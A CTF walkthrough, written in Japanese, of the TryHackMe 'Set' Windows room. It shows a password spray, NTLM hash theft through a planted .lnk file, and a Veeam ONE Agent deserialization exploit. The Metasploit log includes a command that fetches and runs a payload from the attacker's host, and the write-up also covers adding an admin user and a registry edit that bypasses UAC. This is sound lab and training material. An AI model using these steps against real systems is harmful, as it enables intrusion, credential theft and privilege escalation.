# Set CTF

https://tryhackme.com/room/set

## Enumeration

```shell
TARGET=10.48.149.171
sudo bash -c "echo $TARGET   set.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 128
443/tcp   open  https        syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5985/tcp  open  wsman        syn-ack ttl 128
49666/tcp open  unknown      syn-ack ttl 128
```

```sh
sudo nmap -sV -p135,443,445,5985,49666 $TARGET

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49666/tcp open  msrpc         Microsoft Windows RPC
```

HTTPS, SMB, WINRM?

HTTPS証明書から

```
DNS Name: set.windcorp.thm
DNS Name: seth.windcorp.thm
```

hostsに追加。

```
windcorp.thm set.windcorp.thm seth.windcorp.thm
```

Webから得た名前

```
Max Douglas
Marjorie Adams
Nathaniel Martin
Roberta Phillips
John Doe
```

### SMB, NFS, LDAP etc

SMBの無名アクセスは不可。

```sh
$ smbclient -L //$TARGET -U ""                                    
Password for [WORKGROUP\]:
session setup failed: NT_STATUS_LOGON_FAILURE

$ smbclient -L //$TARGET -N   
session setup failed: NT_STATUS_ACCESS_DENIED

$ smbclient -L //$TARGET -U "guest"
Password for [WORKGROUP\guest]:
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```

### サブドメイン、VHOST

サブドメインのファジングではset以外見つからなかった。

```shell
root@ip-10-48-125-179:~# ffuf -u https://windcorp.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.windcorp.thm' -fc 404

set                     [Status: 200, Size: 42259, Words: 10567, Lines: 880, Duration: 144ms]
```

## Web

contactエリアの名前検索で、`https://set.windcorp.thm/assets/data/users.xml` へGETリクエストしている。

users.xml には大量のユーザー情報が含まれていた。

```xml
<results_table>
<row>
<name>Aaron Wheeler</name>
<phone>9553310397</phone>
<email>aaronwhe@windcorp.thm</email>
</row>
<row>
<name>Addison Russell</name>
<phone>9425499327</phone>
<email>addisonrus@windcorp.thm</email>
</row>
...
```

xmlファイルをファジングしたが、users.xml 以外は見つからなかった。

```sh
root@ip-10-48-125-179:~# gobuster dir -q -x=xml -u https://set.windcorp.thm/assets/data/ -w ./dirlist.txt -t 64 -k
/Users.xml            (Status: 200) [Size: 12419]
/users.xml            (Status: 200) [Size: 12419]
```

users.xml からアカウント名、メールアドレス、電話番号のリストを作る。

```sh
$ cat ./users.xml| grep '<email>' | sed 's/<email>//' | sed 's/<\/email>//' | sed 's/@.*//' > accounts.txt

$ cat ./users.xml| grep '<email>' | sed 's/<email>//' | sed 's/<\/email>//' > emails.txt

$ cat ./users.xml| grep '<phone>' | sed 's/<phone>//' | sed 's/<\/phone>//' > phones.txt
```

電話番号、メールアドレス、アカウント名をパスワードとしてSMB認証を試みたがヒットせず。

```sh
$ crackmapexec smb $TARGET -u ./accounts.txt -p ./phones.txt --no-bruteforce 

$ crackmapexec smb $TARGET -u ./accounts.txt -p ./emails.txt --no-bruteforce 

$ crackmapexec smb $TARGET -u ./accounts.txt -p ./accounts.txt --no-bruteforce 
```

ラストネーム＋電話も空振り。

```sh
$ cat ./users.xml| grep '<name>' | sed 's/<name.* //' | sed 's/<\/name>//' > lastnames.txt

$ paste -d '' ./lastnames.txt ./phones.txt > lastname-phone.txt
```

再列挙でappnotes.txtを発見。

```sh
root@ip-10-49-106-10:~# gobuster dir -q -x=txt,xml -u https://set.windcorp.thm/ -w ./dirlist.txt -t 64 -k
/Assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/Assets/]
/FORMS                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/FORMS/]
/Forms                (Status: 301) [Size: 154] [--> https://set.windcorp.thm/Forms/]
/appnotes.txt         (Status: 200) [Size: 146]
/assets               (Status: 301) [Size: 155] [--> https://set.windcorp.thm/assets/]
/forms                (Status: 301) [Size: 154]
```

デフォルトパスワードは非常に一般的だとのヒント。また、問題文に `They had to reset a lot of users and restore backups` と書かれていたので、リセットされたままのユーザーがいると想定。

```sh
$ cat appnotes.txt                                                                        
Notes for the new user-module.

Send mail to user:

Welcome to Set!

Remember to change your default password at once. It is too common.
```

パスワードスプレー。1個ずつ試していったらヒットした。

```sh
$ crackmapexec smb $TARGET -u ./accounts.txt -p 'password' --no-bruteforce
$ crackmapexec smb $TARGET -u ./accounts.txt -p 'ChangeMe#1234' --no-bruteforce
$ crackmapexec smb $TARGET -u ./accounts.txt -p '123456' --no-bruteforce
$ crackmapexec smb $TARGET -u ./accounts.txt -p 'changelater' --no-bruteforce
$ crackmapexec smb $TARGET -u ./accounts.txt -p 'P@ssw0rd' --no-bruteforce
$ crackmapexec smb $TARGET -u ./accounts.txt -p '[REDACTED]' --no-bruteforce
```

認証可能なのはSMBのみ。

```sh
$ nxc winrm $TARGET -u 'myrtleowe' -p '[REDACTED]'
nxc rdp $TARGET -u 'myrtleowe' -p '[REDACTED]'
nxc smb $TARGET -u 'myrtleowe' -p '[REDACTED]'

WINRM       10.49.168.126   5985   SET              [*] Windows 10 / Server 2019 Build 17763 (name:SET) (domain:SET)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.49.168.126   5985   SET              [-] SET\myrtleowe:[REDACTED]
SMB         10.49.168.126   445    SET              [*] Windows 10 / Server 2019 Build 17763 x64 (name:SET) (domain:SET) (signing:False) (SMBv1:False)
SMB         10.49.168.126   445    SET              [+] SET\myrtleowe:[REDACTED]
```

Files 共有を発見。

```sh
$ smbclient -L //$TARGET -U "myrtleowe"
Password for [WORKGROUP\myrtleowe]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        E$              Disk      Default share
        Files           Disk      
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
```

Info.txt をダウンロード。  
zipファイルを格納したらそれを開くらしい。プロジェクトファイルとは？

```sh
$ cat Info.txt                                                                    
Zip and save your project files here. 
We will review them

BTW.
Flag1: THM{[REDACTED]}
```

ntlm_theft でSMBトラップ用のファイルを生成。

```sh
$ python ./ntlm_theft.py --generate all --server 192.168.129.39 --filename project

$ zip project.lnk project.htm
```

lnkファイルをzipにして格納したら、Responderでハッシュを入手でき、rockyouでクラック成功した。

```sh
[SMB] NTLMv2-SSP Client   : 10.49.168.126
[SMB] NTLMv2-SSP Username : SET\MichelleWat
[SMB] NTLMv2-SSP Hash     : MichelleWat::SET:0694978012ec08ac:0FC82880517C554B5330A62A189DD2FE:01010000000000008097B3[REDACTED]
```

WinRM でログイン成功し、フラグ２を入手。

## 権限昇格

権限は無い。

```sh
vil-WinRM* PS C:\Users\MichelleWat> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

MyrtleOwe、One ユーザーのフォルダがある。

```ps
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/7/2020   5:20 AM                Administrator
d-----        7/10/2020  10:55 AM                MichelleWat
d-----        6/15/2020   1:51 PM                MyrtleOwe
d-----        7/10/2020   9:42 AM                One
d-r---         6/7/2020   5:20 AM                Public
```

One は管理者

```ps
*Evil-WinRM* PS C:\Users\MichelleWat> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
One
The command completed successfully.
```

非標準のツールがサービスとして登録されている。

```ps
*Evil-WinRM* PS C:\Users\MichelleWat> services

Path                                                                                                                    Privileges Service                      
----                                                                                                                    ---------- -------                      
...
C:\windows\PSSDNSVC.EXE                                                                                                      False PsShutdownSvc 
...
```

実行されるとしたらSYSTEM権限で実行される。

```ps
*Evil-WinRM* PS C:\Users\MichelleWat> reg query HKLM\SYSTEM\CurrentControlSet\Services\PsShutdownSvc

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PsShutdownSvc
    Type    REG_DWORD    0x110
    Start    REG_DWORD    0x3
    ErrorControl    REG_DWORD    0x0
    ImagePath    REG_EXPAND_SZ    %SystemRoot%\PSSDNSVC.EXE
    DisplayName    REG_SZ    PsShutdown
    WOW64    REG_DWORD    0x14c
    ObjectName    REG_SZ    LocalSystem
```

実行したところ

```ps
*Evil-WinRM* PS C:\Users\MichelleWat> C:\Windows\PSSDNSVC.EXE
PsInfSvc -install          to install the service
PsInfSvc -remove           to remove the service
PsInfSvc -debug <params>   to run as a console app for debugging

StartServiceCtrlDispatcher being called.
This may take several seconds.  Please wait.
```

ghidraで開いてみたが、おそらく正規のプログラムだと思われるためあきらめた。

2805ポートがローカルで開いている。

```ps
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
...
  TCP    127.0.0.1:49754        127.0.0.1:2805         ESTABLISHED     1992
  TCP    127.0.0.1:49780        127.0.0.1:2805         ESTABLISHED     1992
  TCP    127.0.0.1:49788        127.0.0.1:2805         ESTABLISHED     1992
```

PID 1992 は、`Veeam.One.Agent.Service` というサービス。

```ps
    829      54    61284      81012              1992   0 Veeam.One.Agent.Service
```

VeeamOneAgentSvc サービス

```ps
"C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe" -id=3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1      False VeeamOneAgentSvc 
```

実行はできるが書き込みはできない。

```ps
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> icacls "C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe"
C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe NT AUTHORITY\SYSTEM:(I)(F)
                                                                             BUILTIN\Administrators:(I)(F)
                                                                             BUILTIN\Users:(I)(RX)
                                                                             APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                                             APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

サービスレジストリ

```ps
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> reg query HKLM\SYSTEM\CurrentControlSet\Services\VeeamOneAgentSvc

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VeeamOneAgentSvc
    FailureActions    REG_BINARY    00000000000000000000000004000000440055000100000060EA00000100000060EA00000100000060EA00000000000000000000
    Type    REG_DWORD    0x10
    Start    REG_DWORD    0x2
    ErrorControl    REG_DWORD    0x1
    ImagePath    REG_EXPAND_SZ    "C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent\Veeam.One.Agent.Service.exe" -id=3be6b89b-e6de-4e97-bcd4-5c14e9d97fc1
    DisplayName    REG_SZ    Veeam ONE Agent
    WOW64    REG_DWORD    0x14c
    ObjectName    REG_SZ    .\one
    DelayedAutostart    REG_DWORD    0x1
    Description    REG_SZ    Enables remediation actions and communication between Veeam ONE and monitored Veeam Backup & Replication servers.
```

Descriptionの内容。バックアップと称してAdministratorのファイルを読み出せるのではないかと想像するが使い方は知らない。

```
  Veeam ONEと監視対象のVeeam Backup & Replicationサーバー間の修復アクションと通信を可能にします。
```

関連バイナリ

```ps
*Evil-WinRM* PS C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent> ls


    Directory: C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        1/18/2019   7:50 PM         114725 3rdPartyNotices.txt
-a----        1/18/2019   7:50 PM         149504 Appccelerate.StateMachine.dll
-a----        1/18/2019   7:50 PM         255416 Veeam.Communication.dll
-a----        1/18/2019   7:50 PM          75192 Veeam.Communication.Helper.dll
-a----        1/18/2019   7:50 PM         453560 Veeam.One.Agent.Common.dll
-a----        1/18/2019   7:50 PM          22968 Veeam.One.Agent.Configurator.PowerShell.dll
-a----        1/18/2019   7:50 PM          57784 Veeam.One.Agent.Controller.PowerShell.dll
-a----        1/18/2019   7:50 PM          89528 Veeam.One.Agent.Deployment.Common.dll
-a----        1/18/2019   7:50 PM         445880 Veeam.One.Agent.Deployment.Service.exe
-a----        1/18/2019   7:50 PM         311736 Veeam.One.Agent.Service.exe
-a----        1/18/2019   7:50 PM          50616 Veeam.One.Agent.Updater.exe
```

### Veeam ONE Agent .NET デシリアライゼーション  

(リリースライン9および10
のホットフィックスバージョン9.5.5.4587および10.0.1.750より前)  
https://www.rapid7.com/db/modules/exploit/windows/misc/veeam_one_agent_deserialization/

バージョンは、条件を満たしているように見える。

```ps
*Evil-WinRM* PS C:\Program Files\Veeam\Veeam ONE\Veeam ONE Agent> (Get-ItemProperty "Veeam.One.Agent.Service.exe").VersionInfo | Select-Object FileVersion, ProductVersion

FileVersion ProductVersion
----------- --------------
9.5.4.4566  9.5.4.4566
```

metasploitモジュールがあるようだが、ポートが開いていないのでトンネリングが必要。

```sh
msf > use exploit/windows/misc/veeam_one_agent_deserialization
```

2805ポートをトンネリング

```sh
$ ../chisel_1.11.3_linux_amd64 server -p 2888 --reverse &
```

```ps
*Evil-WinRM* PS C:\Users\MichelleWat> .\ch.exe client 192.168.129.39:2888 R:2805:127.0.0.1:2805
```

実行。トンネリングはできているがセッションは作られない。  
おそらくAV保護によりブロックされていると思われる。

```sh
msf exploit(windows/misc/veeam_one_agent_deserialization) > exploit
[*] Started reverse TCP handler on 192.168.129.39:4444 
[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Executing PowerShell Stager for windows/x64/meterpreter/reverse_tcp
[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805
[*] Exploit completed, but no session was created.
```

どのターゲットでも同じだった。

```sh
    Id  Name
    --  ----
    0   Windows Command
    1   Windows Dropper
=>  2   PowerShell Stager
```

送受信データを観察。

```sh
msf exploit(windows/misc/veeam_one_agent_deserialization) > exploit
[*] Started reverse TCP handler on 192.168.129.39:4444 
[*] 127.0.0.1:2805 - Connecting to 127.0.0.1:2805
[*] 127.0.0.1:2805 - Sending host info to 127.0.0.1:2805
[+] 127.0.0.1:2805 - --> Host info packet: "\x05\x02\x0FAgentController"
[+] 127.0.0.1:2805 - <-- Host info reply: "\x03\x02\x00\x00\x00\x00\x00B\xCB\xA0W#\x97AJ\xB1\f_\xFB\xFBa\x94\x8B"
[*] 127.0.0.1:2805 - Executing Windows Dropper for windows/x64/meterpreter_reverse_tcp
[*] 127.0.0.1:2805 - Using URL: http://192.168.129.39:8080/GqHZS5k
[*] 127.0.0.1:2805 - Generated command stager: ["powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\\IWpSotJP.exe http://192.168.129.39:8080/GqHZS5k & %TEMP%\\IWpSotJP.exe & del %TEMP%\\IWpSotJP.exe"]
[*] 127.0.0.1:2805 - Executing command: powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\IWpSotJP.exe http://192.168.129.39:8080/GqHZS5k & %TEMP%\IWpSotJP.exe & del %TEMP%\IWpSotJP.exe
[*] 127.0.0.1:2805 - Sending malicious handshake to 127.0.0.1:2805
[+] 127.0.0.1:2805 - --> Handshake packet: "k\x03\x00\x00\a\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFF\xFF\xFF\x00\x01\x00\x00\x00\xFF\xFF\xFF\xFF\x01\x00\x00\x00\x00\x00\x00\x00\f\x02\x00\x00\x00^Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\x05\x01\x00\x00\x00BMicrosoft.VisualStudio.Text.Formatting.TextFormattingRunProperties\x01\x00\x00\x00\x0FForegroundBrush\x01\x02\x00\x00\x00\x06\x03\x00\x00\x00\x89\x05<ResourceDictionary xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\" xmlns:X=\"http://schemas.microsoft.com/winfx/2006/xaml\" xmlns:S=\"clr-namespace:System;assembly=mscorlib\" xmlns:D=\"clr-namespace:System.Diagnostics;assembly=system\"><ObjectDataProvider X:Key=\"\" ObjectType=\"{X:Type D:Process}\" MethodName=\"Start\"><ObjectDataProvider.MethodParameters><S:String>cmd</S:String><S:String>/c powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\\IWpSotJP.exe http://192.168.129.39:8080/GqHZS5k &amp; %TEMP%\\IWpSotJP.exe &amp; del %TEMP%\\IWpSotJP.exe</S:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>\v"
[*] 127.0.0.1:2805 - Command Stager progress - 100.00% done (147/147 bytes)
[*] 127.0.0.1:2805 - Server stopped.
[*] Exploit completed, but no session was created.
```

Stagerのコマンド実行は成功しているので、Administratorのフラグファイルをユーザーフォルダにコピーする程度の単純なコマンドなら成功するのではないかという気はする。

```ps
Generated command stager: ["powershell.exe -c Invoke-WebRequest -OutFile %TEMP%\\IWpSotJP.exe http://192.168.129.39:8080/GqHZS5k & %TEMP%\\IWpSotJP.exe & del %TEMP%\\IWpSotJP.exe"]
```

エクスプロイトのペイロードをadduserに改造

```rb
  'Targets' => [
    [
      'Windows Command',
      {
        'Arch' => ARCH_CMD,
        'Type' => :win_cmd,
        'DefaultOptions' => {
          'PAYLOAD' => 'cmd/windows/adduser'
        }
      }
    ],
```

エクスプロイトを実行したら、bcユーザーが作成された！

```sh
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> net user

User accounts for \\

-------------------------------------------------------------------------------
AaronWhe                 AddisonRus               Administrator
AidenBoy                 AlicePet                 AllisonNea
AlyssaBak                AndreaCur                AndreaHar
AndreaSte                AndrewPow                AubreeHop
bc                       BeckyWel                 BernardMck
BillieHil                BillieRya                BrandonSpe
```

管理者グループに入っている！

```ps
*Evil-WinRM* PS C:\Users\MichelleWat\Documents> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
bc
One
The command completed successfully.
```

WinRM接続できないので、cmd/windows/generic ペイロードを使う。

```
msf exploit(test/foo) > set CMD net user bc100 Bc_@12345!!!!! /ADD
msf exploit(test/foo) > set CMD net localgroup Administrators bc100 /ADD
msf exploit(test/foo) > set CMD net localgroup \"Remote Management Users\" bc100 /ADD
```

WinRM で接続できたが、UACによりリモートでの管理者権限が削除されている状態。

```sh
*Evil-WinRM* PS C:\Users\Administrator> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ==================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
```

レジストリ操作で、リモートでも管理者権限を付与するよう変更。

```sh
msf exploit(test/foo) > set CMD reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

管理者権限有効！

```ps
*Evil-WinRM* PS C:\Users\bc100\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Remote Management Users                               Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

管理者フォルダの中が見えた。

```ps
*Evil-WinRM* PS C:\Users\Administrator> tree /A /F
Folder PATH listing
Volume serial number is 6EC8-9D7C
C:.
+---3D Objects
+---Contacts
+---Desktop
|       Flag3.txt
|
+---Documents
+---Downloads
+---Favorites
|   |   Bing.url
|   |
|   \---Links
+---Links
|       Desktop.lnk
|       Downloads.lnk
|
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
```

```ps
*Evil-WinRM* PS C:\Users\Administrator> type Desktop\Flag3.txt
Flag3: THM{[REDACTED]}

I am glad we blocked Veeam ONE agent in Firewall, so we can patch it next week.
```

## 振り返り

- パスワードスプレーは時間がかかってしんどかった。appnotes.txt の列挙が後になったのが痛かった。機械的に gobuster をかけていたら初期に発見できていた。
- SMBトラップはスムーズにクリアできた。
- 権限昇格は激ムズに感じた。既存のエクスプロイトを改造して genericペイロードにより自由にコマンドを実行できるのは良い学びになった。
- リモートでUACにより管理者権限が削除される場合に、レジストリ操作で回避する手順も良い学びだった。

## Tags

#tags:Windows #tags:Veeam ONE脆弱性 #tags:SMBトラップ #tags:metasploit
